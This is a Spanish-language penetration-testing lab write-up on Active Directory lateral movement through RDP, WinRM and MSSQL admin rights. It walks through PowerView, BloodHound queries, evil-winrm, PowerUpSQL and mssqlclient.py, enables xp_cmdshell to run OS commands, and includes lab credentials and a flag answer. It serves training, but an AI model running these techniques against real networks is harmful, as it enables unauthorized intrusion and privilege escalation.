
# Acceso Privilegiado

Una vez que logramos afianzarnos en el dominio, nuestro objetivo pasa a ser avanzar más en nuestra posición moviéndonos lateral o verticalmente para obtener acceso a otros hosts y, eventualmente, lograr la vulneración del dominio o algún otro objetivo, según el objetivo de la evaluación. Para lograr esto, existen varias formas de movernos lateralmente. Por lo general, si tomamos el control de una cuenta con derechos de administrador local sobre un host o un conjunto de hosts, podemos realizar un  ataque `Pass-the-Hash` para autenticarnos a través del protocolo SMB.

`Pero, ¿qué pasa si todavía no tenemos derechos de administrador local en ningún host del dominio?`

Hay otras formas de movernos por un dominio de Windows:

* `Remote Desktop Protocol`( `RDP`): es un protocolo de acceso/administración remota que nos brinda acceso GUI a un host de destino
* [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) , también conocido como `PSRemoting` o acceso de administración remota de Windows (`WinRM`), es un protocolo de acceso remoto que nos permite ejecutar comandos o ingresar a una sesión de línea de comandos interactiva en un host remoto mediante PowerShell.
* `MSSQL Server`- una cuenta con privilegios de administrador de sistemas en una instancia de SQL Server puede iniciar sesión en la instancia de forma remota y ejecutar consultas en la base de datos. Este acceso se puede utilizar para ejecutar comandos del sistema operativo en el contexto de la cuenta de servicio de SQL Server a través de varios métodos

Podemos enumerar este acceso de varias formas. La más sencilla, una vez más, es a través de BloodHound, ya que existen las siguientes aristas para mostrarnos qué tipos de privilegios de acceso remoto tiene un usuario determinado:

* [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
* [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
* [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

También podemos enumerar estos privilegios utilizando herramientas como PowerView e incluso herramientas integradas.

***

### Configuración del escenario

En esta sección, nos moveremos entre un host de ataque de Windows y Linux a medida que trabajamos con los distintos ejemplos. Le recomendamos que pruebe todos los métodos que se muestran en esta sección ,es decir, `Enter-PSSession` y `PowerUpSQL` desde el host un de ataque  Windows y `evil-winrm` y `mssqlclient.py` desde un host de ataque Linux.

***

## <mark style="color:purple;">RDP - Remote Desktop Protocol</mark>

Por lo general, si tenemos el control de un usuario administrador local en una máquina determinada, podremos acceder a ella a través de RDP. A veces, obtendremos un punto de apoyo con un usuario que no tiene derechos de administrador local en ninguna parte, pero sí tiene derechos para acceder a una o más máquinas a través de RDP. Este acceso podría resultarnos extremadamente útil, ya que podríamos usar la posición de host para:

* Lanzar más ataques
* Es posible que podamos aumentar los privilegios y obtener credenciales para un usuario con mayores privilegios.
* Es posible que podamos saquear el host para obtener datos o credenciales confidenciales.

Con PowerView, podríamos usar la función [Get-NetLocalGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) para comenzar a enumerar los miembros del grupo `Remote Desktop Users` en un host determinado. Veamos el grupo `Remote Desktop Users` en el `MS01`host de nuestro dominio de destino.

**Enumeración del grupo de usuarios de escritorio remoto**

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

De la información anterior, podemos ver que todos los usuarios del dominio pueden conectarse a este host mediante RDP. Es común ver esto en los hosts de Servicios de Escritorio Remoto (RDS) o en los hosts utilizados como hosts de salto. Este tipo de servidor podría usarse mucho y podríamos encontrar datos confidenciales (como credenciales) que podrían usarse para mejorar nuestro acceso, o podríamos encontrar un vector de escalada de privilegios local que podría llevar al acceso de administrador local y al robo de credenciales/apropiación de cuentas para un usuario con más privilegios en el dominio. Normalmente, lo primero que verifico después de importar datos de BloodHound es:

¿El grupo Usuarios del dominio tiene derechos de administrador local o derechos de ejecución (como RDP o WinRM) sobre uno o más hosts?

**Cómo comprobar los derechos de ejecución y administración local del grupo de usuarios del dominio mediante BloodHound**

![imagen](https://academy.hackthebox.com/storage/modules/143/bh_RDP_domain_users.png)

Si obtenemos control sobre un usuario a través de un ataque como LLMNR/NBT-NS Response Spoofing o Kerberoasting, podemos buscar el nombre de usuario en BloodHound para verificar qué tipo de derechos de acceso remoto tiene, ya sea directamente o heredados a través de la membresía de grupo en `Execution Rights` en la pestaña `Node Info`.

**Comprobación de los derechos de acceso remoto mediante BloodHound**

![imagen](https://academy.hackthebox.com/storage/modules/143/execution_rights.png)

También podríamos revisar la pestaña `Analysis` y ejecutar las consultas predefinidas `Find Workstations where Domain Users can RDP` o `Find Servers where Domain Users can RDP`. Hay otras formas de enumerar esta información, pero BloodHound es una herramienta poderosa que puede ayudarnos a delimitar estos tipos de derechos de acceso de manera rápida y precisa, lo que es muy beneficioso para nosotros como evaluadores de penetración con limitaciones de tiempo para el período de evaluación. Esto también puede ser útil para que el equipo azul audite periódicamente los derechos de acceso remoto en todo el entorno y detecte problemas a gran escala, como que todos los usuarios del dominio tengan acceso no deseado a un host o auditen los derechos de usuarios/grupos específicos.

Para probar este acceso, podemos utilizar una herramienta como `xfreerdp` o `Remmina` desde nuestra VM o Pwnbox o `mstsc.exe` si atacamos desde un host Windows.

***

## <mark style="color:purple;">WinRM</mark>

Al igual que RDP, podemos encontrar que un usuario específico o un grupo entero tiene acceso WinRM a uno o más hosts. Esto también podría ser un acceso con privilegios bajos que podríamos usar para buscar datos confidenciales o intentar aumentar los privilegios o puede resultar en un acceso de administrador local, que podría aprovecharse para aumentar nuestro acceso. Nuevamente podemos usar la función PowerView `Get-NetLocalGroupMember` para el grupo `Remote Management Users`. Este grupo ha existido desde los días de Windows 8/Windows Server 2012 para habilitar el acceso WinRM sin otorgar derechos de administrador local.

**Enumeración del grupo** `Remote Management Users`

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

También podemos utilizar esta `Cypher query` en BloodHound para buscar usuarios con este tipo de acceso. Esto se puede hacer pegando la consulta en el cuadro `Raw Query` de la parte inferior de la pantalla y pulsando Enter.

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

**Cómo utilizar la consulta Cypher en BloodHound**

![imagen](https://academy.hackthebox.com/storage/modules/143/canpsremote_bh_cypherq.png)

También podríamos agregar esto como una consulta personalizada a nuestra instalación de BloodHound, para que siempre esté disponible para nosotros.

**Cómo agregar la consulta Cypher como una consulta personalizada en BloodHound**

![imagen](https://academy.hackthebox.com/storage/modules/143/user_defined_query.png)

Podemos utilizar el cmdlet [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) mediante PowerShell desde un host de Windows.

**Cómo establecer una sesión WinRM desde Windows**

```powershell
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb> 
```

Desde nuestro host de ataque Linux, podemos usar la herramienta [evil-winrm](https://github.com/Hackplayers/evil-winrm) para conectarnos.

Para utilizar `evil-winrm` podemos instalarlo usando el siguiente comando:

**Instalación de Evil-WinRM**

```shell-session
afsh4ck@kali$ gem install evil-winrm
```

Al escribir `evil-winrm` aparecerá el menú de ayuda y todos los comandos disponibles.

**Menú de ayuda de Evil-WinRM**

```shell-session
afsh4ck@kali$ evil-winrm 

Evil-WinRM shell v3.3

Error: missing argument: ip, user

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```

Podemos conectarnos solo con una dirección IP y credenciales válidas.

**Cómo conectarse a un objetivo con Evil-WinRM y credenciales válidas**

```shell-session
afsh4ck@kali$ evil-winrm -i 10.129.201.234 -u forend

Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
ACADEMY-EA-MS01
```

Desde aquí podríamos excavar para planificar nuestro próximo movimiento.

***

## <mark style="color:purple;">SQL Server Admin</mark>

En la mayoría de los casos, nos encontraremos con servidores SQL en los entornos a los que nos enfrentamos. Es habitual encontrar cuentas de usuario y servicio configuradas con privilegios de administrador de sistemas en una instancia determinada de servidor SQL. Podemos obtener credenciales para una cuenta con este acceso a través de Kerberoasting (común) u otros, como LLMNR/NBT-NS Response Spoofing o password spraying. Otra forma de encontrar credenciales de servidor SQL es utilizando la herramienta [Snaffler](https://github.com/SnaffCon/Snaffler) para buscar archivos `web.config` u otros tipos de archivos de configuración que contengan cadenas de conexión de servidor SQL.

BloodHound, una vez más, es una gran apuesta para encontrar este tipo de acceso a través del perímetro `SQLAdmin`. Podemos buscar `SQL Admin Rights` en la pestaña `Node Info` de un usuario determinado o utilizar esta consulta personalizada de Cypher para buscar:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

Aquí vemos un usuario, `damundsen` que tiene derechos `SQLAdmin` sobre el host `ACADEMY-EA-DB01`.

**Cómo utilizar una consulta cifrada personalizada para comprobar los derechos de administrador de SQL en BloodHound**

![imagen](https://academy.hackthebox.com/storage/modules/143/sqladmins_bh.png)

Podemos usar nuestros derechos de ACL para autenticarnos con el usuario `wley`, cambiar la contraseña del usuario `damundsen` y luego autenticarnos con el objetivo usando una herramienta como `PowerUpSQL`, que tiene una [hoja de trucos de comandos](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet) muy útil . Supongamos que cambiamos la contraseña de la cuenta a `SQL1234!` para usar nuestros derechos de ACL. Ahora podemos autenticarnos y ejecutar comandos del sistema operativo.

Primero, busquemos instancias del servidor SQL.

### **PowerUpSQL - Enumeración de instancias MSSQL**

```powershell
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

Luego, podríamos autenticarnos en el host del servidor SQL remoto y ejecutar consultas personalizadas o comandos del sistema operativo. Vale la pena experimentar con esta herramienta, pero las enumeraciones exhaustivas y las tácticas de ataque contra MSSQL están fuera del alcance de este módulo.

```powershell
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

### mssqlclient.py

También podemos autenticarnos desde nuestro host de ataque Linux utilizando [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) del kit de herramientas Impacket.

**Visualización de las opciones de mssqlclient.py**

```shell-session
afsh4ck@kali$ mssqlclient.py 

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

usage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE] [-hashes LMHASH:NTHASH]
                      [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                      target

TDS client implementation (SSL supported).

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

<SNIP>
```

**Ejecución de mssqlclient.py contra el destino**

```shell-session
afsh4ck@kali$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```

Una vez conectados, podremos escribir `help` para ver qué comandos tenemos disponibles.

**Visualización opciones con acceso al servidor SQL**

```
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

Luego podríamos optar por habilitar `enable_xp_cmdshell` el [procedimiento almacenado xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) que permite ejecutar comandos del sistema operativo a través de la base de datos si la cuenta en cuestión tiene los derechos de acceso adecuados.

**Elegir enable\_xp\_cmdshell**

```sql
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Por último, podemos ejecutar comandos en el formato `xp_cmdshell <command>`. Aquí podemos enumerar los derechos que nuestro usuario tiene en el sistema y ver que tenemos [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) , que se puede aprovechar en combinación con una herramienta como [JuicyPotato](https://github.com/ohpe/juicy-potato) , [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) o [RoguePotato](https://github.com/antonioCoco/RoguePotato) para escalar a privilegios de nivel `SYSTEM`, según el host de destino, y usar este acceso para continuar hacia nuestro objetivo.

**Enumerando nuestros derechos en el sistema usando xp\_cmdshell**

```sql
xp_cmdshell whoami /priv
output                                                                             
--------------------------------------------------------------------------------   

NULL                                                                               

PRIVILEGES INFORMATION                                                             
----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL                                                               
```

***

## Caso práctico

```bash
RDP to:
10.129.123.121 (ACADEMY-EA-MS01) # Máquina Windows de empleado
10.129.251.215 (ACADEMY-EA-ATTACK01) # Máquina Linux de atacante
user "htb-student"
password "Academy_student_AD!"
```

### Pregunta 1

¿Qué otro usuario del dominio tiene derechos `CanPSRemote` en un host? ¿A qué host puede acceder este usuario a través de WinRM?

Utilizando la cypher query encontramos al usuario bdavis que se puede conectar por WinRM al host ACADEMY-EA-DC01

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

<figure><img src="/files/MbecD12yTkYZqtQeAJt1" alt=""><figcaption></figcaption></figure>

Entonces vamos a usar al usuario forend con sus credenciales para acceder al host en nombre del usuario bdavis

### Pregunta 2

Utilice los derechos de SQLAdmin para autenticarse en el host ACADEMY-EA-DB01 (`172.16.5.150`). Envíe el contenido de la flag en `C:\Users\damundsen\Desktop\flag.txt`.

#### **Enumeración de instancias MSSQL**

```powershell
PS C:\Tools\PowerUpSQL> Import-Module .\PowerUpSQL.ps1
PS C:\Tools\PowerUpSQL> Get-SQLInstanceDomain


ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/10/2022 3:50 PM
Description      :
```

Encontramos una instancia de MSSQL del usuario `damundsen`, que vamos a explotar

#### mssqlclient.py desde linux

```shell-session
afsh4ck@kali$ python3 mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

```sql
SQL> enable_xp_cmdshell
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
output                                                                             

--------------------------------------------------------------------------------   

1m_the_sQl_@dm1n_n0w!
```

Buum! Obtenemos la flag correctamente mediante `xp_cmdshell` 🏆

***

## <mark style="color:purple;">Hacia adelante</mark>

En esta sección se han demostrado algunas técnicas de movimiento lateral posibles en un entorno de Active Directory. Siempre debemos buscar este tipo de derechos cuando logramos nuestro punto de apoyo inicial y obtenemos el control de cuentas de usuario adicionales. Recuerde que la enumeración y el ataque son procesos iterativos. Cada vez que obtenemos el control de otro usuario o host, debemos repetir algunos pasos de enumeración para ver qué nuevos derechos y privilegios hemos obtenido, si los hay. Nunca pase por alto los derechos de acceso remoto si el usuario no es un administrador local en el host de destino, ya que es muy probable que accedamos a un host donde encontremos datos confidenciales o podamos escalar privilegios.

Por último, siempre que encontremos credenciales SQL (en un script, un archivo web.config u otro tipo de cadena de conexión de base de datos), deberíamos probar el acceso contra cualquier servidor MSSQL del entorno. Este tipo de acceso es un `SYSTEM`acceso casi garantizado a través de un host. Si podemos ejecutar comandos como la cuenta con la que nos autenticamos, casi siempre tendrá el `SeImpersonatePrivilege`derecho peligroso.

La siguiente sección abordará un problema común que solemos encontrar al usar WinRM para conectarnos a hosts en la red.
